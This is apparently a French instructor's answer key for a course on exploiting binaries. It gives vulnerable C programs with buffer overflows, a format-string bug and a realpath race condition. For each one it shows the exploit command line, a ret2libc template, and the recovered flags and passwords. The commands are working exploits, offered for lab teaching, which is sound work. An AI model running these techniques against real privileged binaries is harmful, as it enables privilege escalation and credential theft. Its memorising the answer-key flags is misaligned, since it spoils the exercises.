---
layout: page
title: Une journée d'exploitation (00)
permalink: sploit-00-teacher
---

C'est du sploit, un bon cours, de la pratique, et tout ira bien.


## Exercice -01

Les points à évoquer lors de la présentation :

* la notion de binaire privilégié : en quoi il est intéressant de rechercher
  des vulnérabilités dans les binaires
* GDB : l'importance du débogueur
* GDB : inspecter la mémoire (`x/`, `p`) et le boutisme
* GDB : les points d'arrêts
* `python -c` et l'importance de gêrer son shell
* démonstration d'un crash, dans GDB
* bien mettre l'accent sur l'écrasement d'EIP

Et on termine avec des explications sur comment travailler en machine
virtuelle : les permissions restraintes, `/tmp`, les binaires *setuid*...

Beaucoup de réponses sont en fait valides mais la réponse attendue est la
suivante... En débordant du tampon initialement alloué, on peut écrire la
pile jusqu'à la valeur que va prendre EIP lors de la fameuse restauration de
contexte. EIP étant le pointeur d'instruction, une valeur invalide (valeur
qui n'est pas adressable ou qui pointe sur du code invalide) conduit à
l'arrêt du programme.


## Exercice 00

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    int modify_me;
    char buff[10];

    modify_me = 0;
    fgets(buff, 14, stdin);
    if (modify_me != 0) {
	puts("Welcome to the world of buffer overflow.");
	puts("You can use the following password to login to user ex00b:");
	system("cat /home/ex00b/.passwd");
    }
    else
        puts("Try again !");
    return (0);
}
```
Un tampon de 10 mais une écriture de 14... La variable à écraser se trouve
juste au dessus du tampon donc :

```
ex00@debian:~$ python -c 'print "A" * 14' | ./ex00
Welcome to the world of buffer overflow.
You can use the following password to login to user ex00b:
1PflGqsQDo25JAqO1KLA1VNI8WEBJEa3
ex00@debian:~$
```


## Exercice 01

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    int modify_me;
    char buff[120];

    modify_me = 0;
    fgets(buff, 125, stdin);
    if (modify_me == 0xdeadbeef) {
        puts("First buffer overflow exploitation GG! :)\n");
	system("/bin/sh");
    }
    else
        printf("Try again !\n");
    return (0);
}
```

Même exercice que le précédent mais la valeur à écrire n'est plus arbitraire.
Pas la peine de calculer les offets ou quoi, on écrit simplement la valeur
demander en boucle, on tombera juste grace au padding :

```
ex00b@debian:~$ (python -c "print '\xef\xbe\xad\xde' * 200"; cat -) | ./ex00b
First buffer overflow exploitation GG! :)

cat /home/ex01/.passwd
RaP77hlYj1AyJgzVl8OMzyeu9AvlbNVQ
ex00b@debian:~$
```

On doit trickser pour se garder `stdin` ouvert. **C'est quelque chose qu'on
donne aux étudiants. Il ne faut pas qu'ils soient frustrés par ça.**


## Exercice 01b


```c
#include <stdio.h>
#include <stdlib.h>

void sh() {
    system("/bin/sh");
}

void useless() {
    printf("This is a useless function");
}

int main(void) {
    int var;
    void (*func)()=useless;
    char buf[128];

    fgets(buf,133,stdin);
    func();
    return (0);
}
```

On se récupère l'adresse de la fonction à appeler. Puis on l'écrit en
boucle. Elle devrait se mettre bien dans EIP toute seule :

```
ex01@debian:~$ gdb -q ./ex01
Reading symbols from ./ex01...(no debugging symbols found)...done.
gdb-peda$ b * main
Breakpoint 1 at 0x56555676
gdb-peda$ r
Starting program: /home/ex01/ex01
[...]
gdb-peda$ info address sh
Symbol "sh" is at 0x56555620 in a file compiled without debugging.
gdb-peda$ quit
ex01@debian:~$ (python -c "print '\x20\x56\x55\x56' * 50"; cat -) | ./ex01
cat /home/ex02/.passwd
oTHoUbEJLoZ7QgrCUBelywVI4AgGbTHj
```

Il faut lancer le programme avant d'afficher les adresses. Les offsets ne
sont pas bons autrement.


## Exercice 02

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void copy(char *arg)
{
	char msg[256];
	strcpy(msg,arg);
        printf("Votre argument est : %s\n",msg);
}

int main(int argc, char **argv)
{
	if (argc != 2)
	{
		printf("Usage : prog argv1\n");
		exit(1);
	}

	copy(argv[1]);
	return 0;
}
```

Débordement classique.

Epreuve de Zenk-Security donc pas de correction publique.

Flag : `3MnmpyMyVmUZKX9KXOXjHpGdytKrZ1dd`.


## Exercice 03

```c
#include <stdio.h>

int main(int argc, char *argv[]){
        FILE *secret = fopen("/home/ex04/.passwd", "rt");
        char buffer[33];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

On peut faire leaker la stack et il se trouve que le contenu du buffer
(soit le contenu du fichier `.passwd` du niveau suivant) se trouve
tout proche de nous !

Il faut juste découper son hexa correctement et convertir vers de l'ASCII.

Voyez avec Bryan : 

```
./ex03 `python -c "print('%08x'*14)"` | python2 -c "import sys, binascii; a=sys.stdin.read(); b=''.join([binascii.unhexlify(a[i+6:i+8]+a[i+4:i+6]+a[i+2:i+4]+a[i:i+2]) for i in range(0,len(a),8)]); print(b)"
�UVXVUV����P����ksGO0lN8uNMFyJupNtFersoqwLrYPs6R
```

Wow.

Soit `ksGO0lN8uNMFyJupNtFersoqwLrYPs6R`.


## Exercice 04

Pas de sources cette fois...

Le programme prend un fichier en paramètre. Regardons un peu le code...

```
ex04@debian:~$ gdb ./ex04
gdb-peda$ set print asm-demangle on
gdb-peda$ disas main
[...]
End of assembler dump.
gdb-peda$
```

Bref :

```cpp
#include <limits.h>
#include <stdlib.h>
#include <stdio.h>
#include <fstream>
#include <iostream>
#include <string>

int main(int ac, char **argv) {
    char buffer[PATH_MAX + 1];
    char *filename;
    std::string realpass;
    std::string yourpass;
    std::string realfile("/home/ex05/.passwd");

    if (ac != 2) {
        std::cerr << "USAGE: ./ex04 filename" << std::endl;
    }

    filename = realpath(argv[1], buffer);
    if (filename && std::string(filename) == realfile) {
         std::cerr << "Are you trying to fool me bro?" << std::endl;
         return 84;
    }
    filename = realpath(argv[1], buffer);
    std::ifstream ifs(filename);
    std::ifstream ifsPass("/home/ex05/.passwd");

    if (ifs.is_open() && ifsPass.is_open()) {
        getline(ifs, yourpass);
        getline(ifsPass, realpass);
        if (yourpass == realpass) {
            std::cout << realpass << std::endl;
        }
        else {
            std::cerr << "Try again" << std::endl;
        }
    }
}
```

On a une race condition entre le moment ou le `realpath` est vérifié et le
moment où le fichier est bel et bien lu. On peut utiliser un lien symbolique
variant aussi vite que possible entre : un fichier bidon que l'on peut lire
mais avec un contenu qui ne nous intéresse pas, et `/home/ex05/.passwd`.

Dans un premier terminal :

```
ex04@debian:/tmp/geo$ while true; do touch random; rm random; ln -s /home/ex05/.passwd random; rm random; done
```

Dans un second terminal :

```
while true; do ./ex04 /tmp/geo/random 2> /dev/null; done
0WPRihGwXg6X7qactvwjZ5QVOGK6zt16
```

La vulnérabilité repose sur le fait que la sécurité a été implémenté (mal,
qui le plus) dans la logique de l'application et non en terme de permissions.


## Exercice 05

```c
#include <stdio.h>
#include <string.h>

int main()
{
    char buf[256];

    gets(buf);
    printf(buf);

    return 0;
}
```

On ne peut pas mettre le shellcode dans la pile car pas exécutable. On
va donc faire un *ret2libc*.

On se prend l'adresse de `system()`, l'adresse de `"/bin/sh"`... On trouve
à taton l'offset qu'il faut pour écraser EIP puis :


```
ex05@debian:~$ ./exo02 $(python2 -c 'print "A" * OFFSET + BIN_SH_ADDR + "A" * 4 + SYSTEM_ADDR')
```

Et `0zHQDYAfiluiXcxKwvzSIcts3CALijyU`.


## Exercice 06

Hein ?


## Exercice 07

Il faut que les étudiants nous parlent.
